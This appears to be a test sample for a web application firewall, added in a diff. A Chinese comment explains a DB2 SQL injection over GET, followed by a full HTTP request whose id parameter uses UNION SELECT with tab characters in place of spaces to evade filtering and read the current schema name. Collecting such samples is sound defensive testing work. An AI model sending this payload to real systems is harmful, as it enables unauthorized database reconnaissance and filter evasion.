@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_普通注入(空白符替换绕过)-06506485
+# 基于UNION查询进行空白符替换绕过注入，该SQL注入语句攻击目的是获取当前数据库模式（schema）的名称。攻击者使用UNION关键字将原始查询与自己构造的查询合并在一起，从而获取额外的信息。sysibm.sysdummy1是DB2数据库系统中的一个虚拟表，用于执行特定的查询语句。通过从该表中选择当前模式的名称，攻击者可以获得数据库的相关信息。这可能会为后续的攻击提供有用的信息，如数据库结构、敏感数据等。
+GET /?id=1%2509union%2509select%2509current%2509schema%2509from%2509sysibm.sysdummy1&bid=hd_tag_m8mv26kr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26kr
+RM-PRO-Token: 90374a66e878e08fe68a5eed7c102435
+RM-PRO-Time: 1742808627640
+User-Agent: curl/7.83.1
+
